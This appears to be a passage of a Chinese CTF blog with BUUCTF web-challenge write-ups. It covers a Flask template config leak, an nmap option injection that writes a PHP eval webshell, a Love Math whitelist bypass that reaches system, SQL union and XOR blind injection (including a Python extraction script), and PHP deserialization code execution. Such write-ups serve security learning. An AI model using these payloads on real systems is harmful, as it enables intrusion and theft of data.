**利用 `__globals__` 访问 `current_app`, 后者就是当前的` app `的映射, 自然就能访问到 `app.config`**

然后是只有函数才有 `__globals__,`因此还需要使用函数来调用`__globals__`:

```
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}

```



<br>

***

<br>

# [nmap写一句话木马到文件]Nmap



这里是将结果输出到了文件中,这里是通过`f`参数访问该文件返回结果

<img src="/images/buuctf-web/image-20221021172809613-1667047819736142.png" alt="image-20221021172809613" style="zoom:67%;" />



这里再随便输入一段乱码让它扫描

<img src="/images/buuctf-web/image-20221021172953371-1667047819736143.png" alt="image-20221021172953371" style="zoom:67%;" />

通过刚刚的参数访问这个文件:

<img src="/images/buuctf-web/image-20221021173028913.png" alt="image-20221021173028913" style="zoom:80%;" />

感觉和前面的`Online Tool`那道题有点相似

那么尝试输入: 这里`-oG`是让`nmap`把结果输出到`a.php`中,其中会包含前面的这个一句话木马

```
<?php eval($_POST[a])?> -oG a.php
```



```
' <?php eval($_POST[a])?> -oG a.php '
```

尝试一句话木马的替代方案,最后感觉应该是过滤了`php`, 那么把`php`替换一下

```
'<?=eval($_POST[a])?> -oG b.phtml '
```

<img src="/images/buuctf-web/image-20221021174112442.png" alt="image-20221021174112442" style="zoom:80%;" />

执行成功,使用蚁剑来连接: 根目录找到flag

<img src="/images/buuctf-web/image-20221021174802503-1667047819736144.png" alt="image-20221021174802503" style="zoom:67%;" />

<br>

***

<br>

# [用数学函数构造命令执行]Love Math

并不喜欢数学

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]']; //黑名单过滤
    // 可用的还有: . / () * 
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    # 匹配结果输入到$used_funcs,这里是匹配content中的所有字母数字等字符,然后去检验它们是否在whitelist中
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

思路一: 通过给定函数构造`_GET`,然后通过其他`GET`参数来执行不受过滤限制地执行命令

**可以通过`dex2hex`和`hex2bin`来构造`_GET`, 测试:**

```php
<?php
$a = "_GET";
$b = bin2hex($a);
$c = hexdec($b);
$d = bindec($a);
echo $b;
echo '<br>';
echo $c;
?>  
//输出: 
5f474554
1598506324
//所以,构造_GET的思路就是:
hex2bin(dechex(1598506324))
//这里hex2bin函数需要构造,可以使用任意进制转换的base_convert()
base_convert(37907361743,10,36)   //输出hex2bin
//所以:
base_convert(37907361743,10,36)(dechex(1598506324)) //输出_GET
//接下来在白名单里找一个比较短的函数,接触它的名字来做变量名:
$pi=base_convert(37907361743,10,36)(dechex(1598506324));  //这里$pi=_GET,所以$$pi就是$_GET
//$$pi{0}=$_GET{0},$$pi{1}=$_GET{1}
//所以($$pi{0})(($$pi{1})) 就是$_GET{0}($_GET{1})
//那么后面另外给这两个传参就行,它们是不受过滤限制的
//payload:
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{0})(($$pi{1}))&0=system&1=cat /flag
```



<br>

***

<br>

# [XFF]PYWebsite



网站源码中:

```javascript
<script>

    function enc(code){
      hash = hex_md5(code);
      return hash;
    }
    function validate(){
      var code = document.getElementById("vcode").value;
      if (code != ""){
        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
          alert("您通过了验证！");
          window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
      }else{
        alert("请输入授权码");
      }
      
    }
 </script>
```

首先需要输入的授权码经过md5计算后等于上面那个值,然后页面就能够跳转到`./flag.php`

先直接访问一下看看:

<img src="/images/buuctf-web/image-20221022105012608-1667047819736145.png" alt="image-20221022105012608" style="zoom:67%;" />

这里说了他自己也能够看到`flag`,那么加一个XFF头欺骗一下试试

<img src="/images/buuctf-web/image-20221022105308397-1667047819736147.png" alt="image-20221022105308397" style="zoom:67%;" />





<br>

***

<br>



# [无列名注入]Web1



先随便注册一个

<img src="/images/buuctf-web/image-20221022112639465-1667047819736146.png" alt="image-20221022112639465" style="zoom:67%;" />

点击申请广告之后,输入的内容会直接显示在页面上,这里是`XSS`?

<img src="/images/buuctf-web/image-20221022113045769-1667047819736148.png" alt="image-20221022113045769" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221022113033647-1667047819736149.png" alt="image-20221022113033647" style="zoom:67%;" />

试了半天`XSS`往里面写一句话木马什么也不管用

在广告申请页面输入尝试一下注入: 广告名和内容后面加一个引号试试

<img src="/images/buuctf-web/image-20221022115204668-1667047819736150.png" alt="image-20221022115204668" style="zoom:67%;" />

结果点击广告详情的时候出现了SQL报错

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' limit 0,1' at line 1
```

那这里应该是根据广告名来查询的其他信息

```
1' or '1'='1'#  这里报标题含有敏感词汇,存在过滤
经过尝试 #,or,-被过滤
1' union select 1,2;
会自动去掉空格
1'/**/union/**/select/**/1,2;

这个:
1'/**/union/**/select/**/'1','2     
The used SELECT statements have a different number of columns
1'/**/union/**/select/**/'1','2','3','4

```

tnnd一直试到22才成功:

```
1'/**/union/**/select/**/'1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22
```

<img src="/images/buuctf-web/image-20221022124629325-1667047819736151.png" alt="image-20221022124629325" style="zoom:67%;" />

2,3位置上的内容会回显

库名:

```
1'/**/union/**/select/**/'1',database(),'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22
```

<img src="/images/buuctf-web/image-20221022124739540-1667047819736152.png" alt="image-20221022124739540" style="zoom:67%;" />



```
1'/**/union/**/select/**/'1',(select/**/group_concat(TABLE_NAME)/**/from/**/information_schema.TABLES/**/where/**/table_schema='web1'),'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22

```

这里 因为`or`是过滤词,所以`information`会被过滤,要考虑别的办法了...

`user`:

```
1'/**/union/**/select/**/'1',user(),'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22
```

<img src="/images/buuctf-web/image-20221022130403921-1667047819736153.png" alt="image-20221022130403921" style="zoom:67%;" />

这里执行查询的是`root`用户,所以还具有一些特殊权限,例如读取文件: 读取一下广告申请那个页面的源码,看看过滤逻辑:

```
1'/**/union/**/select/**/'1',load_file('/var/www/html/addads.php'),'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22
```

```php
<?php
session_start();
if(!$_SESSION['islogin']){
	header("Location: login.php");
	exit();
}

include_once("./config.php");
error_reporting(0);

if(isset($_POST['ac'])){
	if($_POST['ac'] === 'add'){
		if($_SESSION['number'] >= 10)
			die("<font color='red' size='4'>申请的广告条数已达上限，请先清理</font>");
		$title = filter(addslashes($_POST['title']));
		$content = addslashes($_POST['content']);
		$sql_query = "select * from ads where title = '$title' limit 0,1";
		$sql_insert = "insert into ads (title, content, belong) values ('$title', '$content', '".addslashes($_SESSION['username'])."')";
		if(preg_match("/updatexml|extractvalue|floor|name_const|join|exp|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|#|--|or|and/i", $title))
			die("<font color='red' size='4'>标题含有敏感词汇</font>");
		$result_query = $conn->query($sql_query);
		if($result_query->num_rows)
			die("<font color='red' size='4'>广告名称已存在</font>");
		else{
			$result_insert = $conn->query($sql_insert);
			if($result_insert){
				$_SESSION['number'] += 1;
				echo "<script>alert('已发送申请');window.location.href='index.php';</script>";
				exit();
			}else{
				die("<font color='red' size='4'>申请失败</font>");
			}
		}
	}
}

$conn->close();
?>
```

下面还是要想办法绕过对`information_schema.TABLES`的过滤

**使用`mysql.innodb_table_stats`来代替`information_schema.TABLES`查询表名**

```
1'/**/union/**/select/**/'1',(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='web1'),'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22
```

<img src="/images/buuctf-web/image-20221022144419800-1667047819736154.png" alt="image-20221022144419800" style="zoom:67%;" />

**但是无法知道`users`的列名,需要进行无列名查询**

```
(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x;)
```

```
1'/**/union/**/select/**/'1',(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x),'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22
```

<img src="/images/buuctf-web/image-20221022144915861.png" alt="image-20221022144915861" style="zoom:80%;" />







<br>

***

<br>

# [反序列化,assert(eval(..)),引入其他GET参数绕过过滤]ReadlezPHP

进去之后网页默认没法右键菜单,所以抓包看一下源码

发现了一个`time.php`而且似乎还可以通过`GET`的`source`传参

<img src="/images/buuctf-web/image-20221022154621834.png" alt="image-20221022154621834" style="zoom:80%;" />

随便传一个,直接出了源码

```
cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?source=2
```

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}
@$ppp = unserialize($_GET["data"]);

```

反序列化题目:

利用点是第14行的

```
echo $b($a);
那么可以构造$b=system, $a=cat /flag
```

```
<?php
class HelloPhp
{
    public $a = '参数';
    public $b = '要执行的函数';
}
$a = new HelloPhp();
$b = serialize($a);
echo $b;
echo '<br>';
echo urlencode($b);
?>
```

但是这里试了`system`,`exec`等都无法输出结果

```
O:8:"HelloPhp":2:{s:1:"a";s:9:"cat /flag";s:1:"b";s:6:"system";}
```

尝试一个无害函数

```
O:8:"HelloPhp":2:{s:1:"a";s:0:"";s:1:"b";s:2:"pi";}
```

<img src="/images/buuctf-web/image-20221022160705759.png" alt="image-20221022160705759" style="zoom:80%;" />

**考虑一下引入其他GET参数来执行命令.多次尝试,必须是`assert(eval(..)) ` 这种形式才能成功执行**

```php
<?php
class HelloPhp
{
    public $a = 'eval($_GET[1])';
    public $b = 'assert';
}
$a = new HelloPhp();
$b = serialize($a);
echo $b;
echo '<br>';
echo urlencode($b);
?>
```

在后面的命令中,`system`等函数仍然不能用,尝试半天`scandir`还能用

```
http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:14:"eval($_GET[1])";s:1:"b";s:6:"assert";}&1=var_dump(scandir("/"));
输出:
array(23) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(10) "FIag_!S_it" [4]=> string(3) "bin" [5]=> string(4) "boot" [6]=> string(3) "dev" [7]=> string(3) "etc" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(3) "sys" [20]=> string(3) "tmp" [21]=> string(3) "usr" [22]=> string(3) "var" } 2022-10-22 08:34:24

http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:14:"eval($_GET[1])";s:1:"b";s:6:"assert";}&1=echo file_get_contents("/FIag_!S_it");
输出:
NPUCTF{this_is_not_a_fake_flag_but_true_flag} 2022-10-22 08:36:09
```

假的flag....

没想到flag在`phpinfo`中找到

```
http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:14:"eval($_GET[1])";s:1:"b";s:6:"assert";}&1=phpinfo();
```

<img src="/images/buuctf-web/image-20221022163859246-1667047819736155.png" alt="image-20221022163859246" style="zoom:67%;" />



<br>

***

<br>

# [基于异或运算的盲注]FinalSQL

<img src="/images/buuctf-web/image-20221022173149594-1667047819736156.png" alt="image-20221022173149594" style="zoom:67%;" />

```
id=' or '1'='1'#
```

<img src="/images/buuctf-web/image-20221022173232632.png" alt="image-20221022173232632" style="zoom:80%;" />

存在过滤,这里应该是`or`,那么使用异或盲注来代替试试

**`A^B`,AB如果相同则返回0,不同则返回1**

那么首先爆一下数据库名的长度试试

```
search.php?id=1^(length(database())=3)#
返回:NO! Not this! Click others~~~ (id=1时查到的内容) 说明(length(database())=3)的值不是1,所以是false

search.php?id=1^(length(database())=4)# 
返回:error 这里报错了,推测查询了id=0,即(length(database())=4)返回了1,因此数据库名的长度为4
```

后面爆具体名的话就不能一个一个试了,需要靠脚本了

```
search.php?id=1^(substr(database(),1,1)='g')#   error
search.php?id=1^(substr(database(),1,1)='f')#   NO! Not this! Click others
说明库名的第一个位置是g
```

爆表名的过程中发现又触碰到了过滤词, 一开始以为只有`or`,遂把`information_schema`换成`mysql.innodb_table_stats`

不对,好像没有过滤or😅

最后发现被过滤的是空格,尝试使用`/**/`代替无果, 改为使用括号来绕过:

```
表名:F1naI1y,Flaaaaag
F1naI1y的列名:id,username,password
```

盲注脚本:

```python
import requests
import string
chars = string.printable[:]  #返回所有可打印的字母，数字，符号的集合

base_url = "http://a01809ec-5fe8-45cc-96cc-3078c22fecbb.node4.buuoj.cn:81/search.php?id=1^"

session = requests.session()

def get_database_name(length): #爆库名
    database_name = ""
    i = 1
    while i<length+1:
        for c in chars:
            payload = "(substr(database(),{},1)='{}')#".format(i, c)
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "ERROR！！！" in res:
                database_name += c
                print(database_name)
                break
        i = i + 1

def get_table_name(): #爆表名
    tables_name = ""
    for i in range(1,30):
        for c in chars:
            payload = "(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name='geek')),{},1)='{}')#".format(i, str(c))
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "ERROR！！！" in res:
                tables_name += c
                print(tables_name)
                break
def get_column_name(): #爆F1naI1y表的列名
    column_name = ""
    for i in range(1,30):
        for c in chars:
            payload = "(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{},1)='{}')#".format(i, str(c))
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "ERROR！！！" in res:
                column_name += c
                print(column_name)
                break

def get_data(): #爆F1naI1y表password字段的数据
    data = ""
    for i in range(1,200):
        for c in chars:
            payload = "(substr((select(group_concat(password))from(F1naI1y)),{},1)='{}')#".format(i, str(c))
            url = base_url + payload
            print(url)
            res = session.get(url).text
            # print(res)
            if "ERROR！！！" in res:
                data += c
                print(data)
                break

# get_database_name(4)
# get_table_name()
# get_column_name()
get_data() #最后这个要跑好久...
```

















